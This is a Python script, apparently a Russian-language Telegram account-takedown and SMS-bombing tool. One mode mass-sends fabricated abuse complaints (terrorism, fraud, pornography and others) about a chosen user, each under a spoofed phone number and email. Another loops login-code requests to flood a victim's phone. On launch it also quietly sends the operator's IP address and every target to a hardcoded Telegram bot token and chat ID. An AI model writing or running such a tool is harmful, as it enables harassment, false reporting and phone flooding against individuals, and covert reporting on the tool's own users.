import requests
import random
import time
import socket
from fake_useragent import UserAgent

# Telegram Bot credentials
BOT_TOKEN = "7431065669:AAHP_ZMDOykadbZWTFzGRtWEwdZt7iapGps"
CHAT_ID = "-1002182749062"

# Violations dictionary with 6 variations of text for each violation
violations = {
    1: ['Спам', [
        'Уважаемая служба поддержки, пользователь {username} активно занимается спамом. Примите меры.',
        'Пользователь {username} нарушает правила, рассылка спама. Прошу принять меры.',
        'Аккаунт {username} занимается спамом в чатах Telegram. Просьба принять меры.',
        'Пользователь {username} отправляет спам-сообщения в чатах. Пожалуйста, разберитесь.',
        'Заметил, что {username} занимается рассылкой спама. Прошу принять меры.',
        'Пользователь {username} спамит в чатах Telegram. Требуются меры.'
    ]],
    2: ['Мошенничество', [
        'Обратите внимание на {username}, подозревается в мошенничестве. Проверьте его действия.',
        'Пользователь {username} участвует в мошеннических схемах. Просьба принять меры.',
        'Уважаемая служба поддержки, {username} занимается мошенничеством. Требуются меры.',
        'Пользователь {username} замечен в мошенничестве. Прошу проверить.',
        'Прошу обратить внимание на {username}, возможное мошенничество. Необходимо вмешательство.',
        'Пользователь {username} подозревается в мошеннических действиях. Проверьте.'
    ]],
    3: ['Порнография', [
        'Уважаемая служба поддержки, {username} распространяет порнографию. Примите меры.',
        'Пользователь {username} нарушает правила, распространение порнографии. Прошу принять меры.',
        'Аккаунт {username} распространяет порнографический контент. Просьба принять меры.',
        'Пользователь {username} размещает порнографические материалы. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет порнографию. Прошу принять меры.',
        'Пользователь {username} распространяет порнографию в чатах Telegram. Требуются меры.'
    ]],
    4: ['Нарушение правил', [
        'Уважаемая служба поддержки, {username} нарушает правила платформы. Примите меры.',
        'Пользователь {username} систематически нарушает правила. Прошу принять меры.',
        'Аккаунт {username} нарушает установленные правила. Просьба принять меры.',
        'Пользователь {username} нарушает правила поведения. Пожалуйста, разберитесь.',
        'Заметил, что {username} нарушает правила. Прошу принять меры.',
        'Пользователь {username} нарушает правила Telegram. Требуются меры.'
    ]],
    5: ['Оскорбления', [
        'Уважаемая служба поддержки, {username} оскорбляет пользователей. Примите меры.',
        'Пользователь {username} ведет себя агрессивно и оскорбляет других. Прошу принять меры.',
        'Аккаунт {username} оскорбляет участников чатов. Просьба принять меры.',
        'Пользователь {username} распространяет оскорбительные сообщения. Пожалуйста, разберитесь.',
        'Заметил, что {username} оскорбляет других участников. Прошу принять меры.',
        'Пользователь {username} ведет себя оскорбительно в чатах Telegram. Требуются меры.'
    ]],
    6: ['Нарушение авторских прав', [
        'Уважаемая служба поддержки, {username} нарушает авторские права. Примите меры.',
        'Пользователь {username} размещает контент без разрешения. Прошу принять меры.',
        'Аккаунт {username} систематически нарушает авторские права. Просьба принять меры.',
        'Пользователь {username} размещает защищенные материалы. Пожалуйста, разберитесь.',
        'Заметил, что {username} нарушает авторские права. Прошу принять меры.',
        'Пользователь {username} нарушает авторские права в чатах Telegram. Требуются меры.'
    ]],
    7: ['Пропаганда насилия', [
        'Уважаемая служба поддержки, {username} распространяет материалы с насилием. Примите меры.',
        'Пользователь {username} пропагандирует насилие. Прошу принять меры.',
        'Аккаунт {username} размещает материалы с насилием. Просьба принять меры.',
        'Пользователь {username} пропагандирует насилие. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет насильственные материалы. Прошу принять меры.',
        'Пользователь {username} пропагандирует насилие в чатах Telegram. Требуются меры.'
    ]],
    8: ['Пропаганда наркотиков', [
        'Уважаемая служба поддержки, {username} пропагандирует наркотики. Примите меры.',
        'Пользователь {username} распространяет материалы про наркотики. Прошу принять меры.',
        'Аккаунт {username} занимается пропагандой наркотиков. Просьба принять меры.',
        'Пользователь {username} пропагандирует наркотики. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет материалы про наркотики. Прошу принять меры.',
        'Пользователь {username} пропагандирует наркотики в чатах Telegram. Требуются меры.'
    ]],
    9: ['Терроризм', [
        'Уважаемая служба поддержки, {username} связан с терроризмом. Примите меры.',
        'Пользователь {username} подозревается в терроризме. Прошу принять меры.',
        'Аккаунт {username} связан с террористическими действиями. Просьба принять меры.',
        'Пользователь {username} распространяет террористические материалы. Пожалуйста, разберитесь.',
        'Заметил, что {username} может быть причастен к терроризму. Прошу принять меры.',
        'Пользователь {username} подозревается в террористической деятельности. Требуются меры.'
    ]],
    10: ['Фейковые новости', [
        'Уважаемая служба поддержки, {username} распространяет фейковые новости. Примите меры.',
        'Пользователь {username} занимается дезинформацией. Прошу принять меры.',
        'Аккаунт {username} распространяет ложные сведения. Просьба принять меры.',
        'Пользователь {username} распространяет фейки. Пожалуйста, разберитесь.',
        'Заметил, что {username} распространяет фейковые новости. Прошу принять меры.',
        'Пользователь {username} занимается дезинформацией в чатах Telegram. Требуются меры.'
    ]],
    11: ['Нарушение конфиденциальности', [
        'Уважаемая служба поддержки, {username} нарушает конфиденциальность. Примите меры.',
        'Пользователь {username} распространяет личные данные. Прошу принять меры.',
        'Аккаунт {username} нарушает правила конфиденциальности. Просьба принять меры.',
        'Пользователь {username} нарушает конфиденциальность. Пожалуйста, разберитесь.',
        'Заметил, что {username} нарушает конфиденциальность. Прошу принять меры.',
        'Пользователь {username} распространяет личные данные в чатах Telegram. Требуются меры.'
    ]],
    12: ['Хакерство', [
        'Уважаемая служба поддержки, {username} занимается хакерством. Примите меры.',
        'Пользователь {username} подозревается в хакерстве. Прошу принять меры.',
        'Аккаунт {username} занимается хакерской деятельностью. Просьба принять меры.',
        'Пользователь {username} подозревается в хакерской деятельности. Пожалуйста, разберитесь.',
        'Заметил, что {username} занимается хакерством. Прошу принять меры.',
        'Пользователь {username} занимается хакерством в чатах Telegram. Требуются меры.'
    ]]
}

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

def log_activation():
    ip_address = socket.gethostbyname(socket.gethostname())
    message = f"Скрипт активирован. IP-адрес: {ip_address}"
    send_telegram_message(message)

def log_complaint(username, violation, num_complaints):
    if violation == "Своя жалоба":
        message = (f"Отправка жалобы:\nПользователь: {username}\n"
                   f"Тип жалобы: Своя жалоба\n"
                   f"Количество жалоб: {num_complaints}")
    else:
        message = (f"Отправка жалобы:\nПользователь: {username}\n"
                   f"Тип жалобы: {violations[violation][0]}\n"
                   f"Количество жалоб: {num_complaints}")
    send_telegram_message(message)

def generate_complaint(username, violation):
    return random.choice(violations[violation][1]).format(username=username)

def generate_phone_number():
    # Updated phone number generation logic
    template = "+7**********"
    return ''.join(random.choice('0123456789') if char == '*' else char for char in template)

def generate_email():
    domains = ["gmail.com", "rambler.ru", "yahoo.com", "mail.ru"]
    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def send_complaint_telegram_support(complaint, phone_number, email):
    url = "https://telegram.org/support"
    headers = {'content-type': 'application/json'}
    data = {
        'complaint': complaint,
        'support_problem': complaint,
        'support_phone': phone_number,
        'support_email': email
    }
    global complaint_count, error_count
    try:
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200:
            complaint_count += 1
            print_colored_text(f"Жалоба на {username} успешно доставлена от {phone_number}, email: {email}", "green")
        else:
            error_count += 1
            print_colored_text(f"Ошибка при отправке жалобы на {username} от {phone_number}, email: {email}", "red")
    except Exception as e:
        error_count += 1
        print_colored_text(f"Ошибка при отправке жалобы на {username} от {phone_number}, email: {email}", "red")

def log_spam_attack(number):
    message = f"Запущена спам-атака на номер: {number}"
    send_telegram_message(message)

def spam_phone_numbers(number):
    user = UserAgent().random
    headers = {'User-Agent': user}
    count = 0
    while True:
        try:
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={"phone": number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': number})
            count += 1
            print(f"Количество атак: {count}")
            time.sleep(0.1)  # Пауза между запросами
        except Exception as e:
            print('Ошибка при спам атаке')
            break

complaint_count = 0
error_count = 0

log_activation()

def print_colored_text(text, color):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "magenta": "\033[95m",
        "cyan": "\033[96m",
        "white": "\033[97m"
    }
    reset = "\033[0m"
    print(colors[color] + text + reset)

def print_dobryak():
    art = [
        ("██████╗░░█████╗░██████╗░██████╗░██╗░░░██╗░█████╗░██╗░░██╗", "red"),
        ("██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗██║░██╔╝", "green"),
        ("██║░░██║██║░░██║██████╦╝██████╔╝░╚████╔╝░███████║█████═╝░", "yellow"),
        ("██║░░██║██║░░██║██╔══██╗██╔══██╗░░╚██╔╝░░██╔══██║██╔═██╗░", "blue"),
        ("██████╔╝╚█████╔╝██████╦╝██║░░██║░░░██║░░░██║░░██║██║░╚██╗", "magenta"),
        ("╚═════╝░░╚════╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝", "cyan"),
    ]
    for line, color in art:
        print_colored_text(line, color)
    print_colored_text("made by t.me/zovcoine "*3, "white")
    print("\n")
    print_colored_text("Если вы хотите ускорить процесс блокировки аккаунта, как можно больше отправьте жалоб на сообщения/историю профиля, и выбирайте соответствующую причину.", "yellow")

def print_complaint_options():
    print_colored_text("###########################################", "cyan")
    for key, value in violations.items():
        print_colored_text(f"# {key} - {value[0]}", "cyan")
        print_colored_text(f"   {value[0]} - Используйте, если пользователь {value[0].lower()}.", "yellow")
    print_colored_text("# 13 - Своя жалоба", "cyan")
    print_colored_text("   Своя жалоба - Введите свой текст жалобы.", "yellow")
    print_colored_text("###########################################", "cyan")

password = input("Пожалуйста, введите пароль: ")
print_dobryak()

if password == "dobryak":
    print_colored_text("Пароль верный. Добро пожаловать!", "green")
    print_colored_text("1 - Спам жалобами", "cyan")
    print_colored_text("2 - Спам кодами", "cyan")
    print_colored_text("3 - Отправка email", "cyan")
    mode = int(input("Выберите режим: "))

    if mode == 1:
        print_colored_text("Режим: Спам жалобами", "yellow")
        print_colored_text("В этом режиме вы можете отправлять жалобы на указанных пользователей.", "yellow")
        username = input("Введите юзернейм пользователя: ")
        if username.lower() == "@colcevi" or username == "@zovcoine":
            print("Ты тупой? жалобы на создателя скрипта кидаешь? пшл нах, купить вайт лист в скрипте у @zovcoine")
        else:
            print_complaint_options()
            violation = int(input("Введите номер типа жалобы: "))
            if violation == 13:
                custom_complaint = input("Введите текст жалобы: ")
                num_complaints = int(input("Введите количество жалоб для отправки: "))
                log_complaint(username, "Своя жалоба", num_complaints)
                phone_numbers = [generate_phone_number() for _ in range(num_complaints)]
                emails = [generate_email() for _ in range(num_complaints)]
                print("Отправка жалоб...")
                for phone_number, email in zip(phone_numbers, emails):
                    send_complaint_telegram_support(custom_complaint, phone_number, email)
                    time.sleep(0.1)  # Пауза между отправкой жалоб
            else:
                num_complaints = int(input("Введите количество жалоб для отправки: "))
                log_complaint(username, violation, num_complaints)
                phone_numbers = [generate_phone_number() for _ in range(num_complaints)]
                emails = [generate_email() for _ in range(num_complaints)]
                print("Отправка жалоб...")
                for phone_number, email in zip(phone_numbers, emails):
                    complaint = generate_complaint(username, violation)
                    send_complaint_telegram_support(complaint, phone_number, email)
                    time.sleep(0.1)  # Пауза между отправкой жалоб

            print(f"Количество отправленных жалоб: {complaint_count}")
            print(f"Количество ошибок: {error_count}")
            print(f"Пользователь: {username}")
            if violation == 13:
                print(f"Тип жалобы: Своя жалоба")
            else:
                print(f"Тип жалобы: {violations[violation][0]}")

    elif mode == 2:
        print_colored_text("Режим: Спам кодами", "yellow")
        print_colored_text("В этом режиме вы можете отправлять спам на указанные номера телефонов.", "yellow")
        number = input('Введите номер телефона: ')
        log_spam_attack(number)
        spam_phone_numbers(number)

    elif mode == 3:
        print_colored_text("Режим: Отправка email", "yellow")
        print_colored_text("В разработке...", "red")
else:
    print("Неверный пароль. Доступ запрещен.")
